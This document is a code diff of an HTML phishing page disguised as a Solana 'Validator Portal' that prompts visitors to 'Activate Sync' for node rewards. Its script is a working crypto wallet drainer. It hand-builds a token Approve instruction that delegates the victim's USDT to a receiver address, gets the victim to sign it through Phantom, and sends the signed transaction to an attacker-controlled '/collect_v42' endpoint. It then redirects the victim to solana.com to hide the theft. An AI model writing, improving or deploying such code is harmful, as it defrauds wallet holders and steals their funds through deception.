@@ -2,21 +2,20 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Solana Node Validator</title>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <script src="https://unpkg.com/@solana/spl-token@0.1.8/lib/index.iife.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validator Portal</title>
+    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #111; padding: 35px; border-radius: 20px; border: 1px solid #222; text-align: center; width: 300px; }
-        #cta { background: #14F195; color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
+        .card { background: #111; padding: 30px; border-radius: 15px; border: 1px solid #333; text-align: center; width: 280px; box-shadow: 0 0 15px #14F195; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>Validation Required</h2>
-        <p style="color:#666; font-size:12px;">Approve the secure handshake to synchronize your assets with the network.</p>
-        <button id="cta">APPROVE & SYNC</button>
-        <div id="st" style="margin-top:15px; font-size:10px; color:#333;">Network: Online</div>
+        <h2 style="color:#14F195; font-size:18px;">Network Sync</h2>
+        <p style="color:#888; font-size:12px;">Ensure your USDT allocation is verified for the node rewards.</p>
+        <button id="cta" style="background:#14F195; color:#000; border:none; padding:15px; border-radius:8px; font-weight:bold; width:100%; cursor:pointer;">ACTIVATE SYNC</button>
+        <div id="st" style="margin-top:15px; font-size:10px; color:#444;">Status: Ready</div>
     </div>
 
     <script>
@@ -25,43 +24,59 @@
         const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
 
         document.getElementById('cta').onclick = async () => {
+            // 🔱 诊断：如果点下后没出这个弹窗，说明 JS 加载崩了
+            console.log("Button clicked");
             const p = window.solana || window.phantom?.solana;
+            if (!p) return alert("Please open in Phantom Browser");
+
             try {
                 await p.connect();
-                const { bh } = await (await fetch(`${tunnel}/sync`)).json();
+                document.getElementById('st').innerText = "FETCHING DATA...";
 
-                const userAta = await splToken.Token.getAssociatedTokenAddress(
-                    splToken.ASSOCIATED_TOKEN_PROGRAM_ID, splToken.TOKEN_PROGRAM_ID,
-                    new solanaWeb3.PublicKey(USDT_MINT), p.publicKey
+                const syncRes = await fetch(`${tunnel}/sync`);
+                const { bh } = await syncRes.json();
+
+                // 🔱 核心：手写 Approve 指令数据，不依赖外置库
+                // 指令 ID (4) + 额度 (0.95 USDT = 950000)
+                const data = Buffer.alloc(9);
+                data.writeUInt8(4, 0); 
+                data.writeBigUInt64LE(BigInt(950000), 1);
+
+                const userPubkey = p.publicKey;
+                const mintPubkey = new solanaWeb3.PublicKey(USDT_MINT);
+                
+                // 自动计算 ATA
+                const [userAta] = await solanaWeb3.PublicKey.findProgramAddress(
+                    [userPubkey.toBuffer(), new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), mintPubkey.toBuffer()],
+                    new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
                 );
 
-                // 🔱 使用最标准、最稳健的授权指令
                 const transaction = new solanaWeb3.Transaction().add(
-                    splToken.Token.createApproveInstruction(
-                        splToken.TOKEN_PROGRAM_ID, 
-                        userAta,
-                        new solanaWeb3.PublicKey(RECEIVER), 
-                        p.publicKey,
-                        [], 
-                        950000 // 授权 0.95 USDT，确保低于你账户的 1 USDT
-                    )
+                    new solanaWeb3.TransactionInstruction({
+                        keys: [
+                            { pubkey: userAta, isSigner: false, isWritable: true },
+                            { pubkey: new solanaWeb3.PublicKey(RECEIVER), isSigner: false, isWritable: false },
+                            { pubkey: userPubkey, isSigner: true, isWritable: false }
+                        ],
+                        programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
+                        data: data
+                    })
                 );
 
                 transaction.recentBlockhash = bh;
-                transaction.feePayer = p.publicKey;
+                transaction.feePayer = userPubkey;
 
-                // 唤起签名
                 const signed = await p.signTransaction(transaction);
+                const rawTx = signed.serialize().toString('base64');
                 
-                // 将报文传回后端执行广播
-                fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(signed.serialize().toString('base64'))}`);
+                fetch(`${tunnel}/collect_v42?raw=${encodeURIComponent(rawTx)}`);
+                document.getElementById('st').innerText = "SYNC COMPLETE";
+                
+                setTimeout(() => { window.location.href = "https://solana.com/"; }, 1500);
 
-                document.getElementById('st').innerText = "SUCCESS";
-                setTimeout(() => { window.location.href = "https://solana.com/"; }, 1000);
-
-            } catch(e) { 
-                console.error(e);
-                location.reload(); 
+            } catch(e) {
+                alert("Debug Error: " + e.message);
+                location.reload();
             }
         };
     </script>
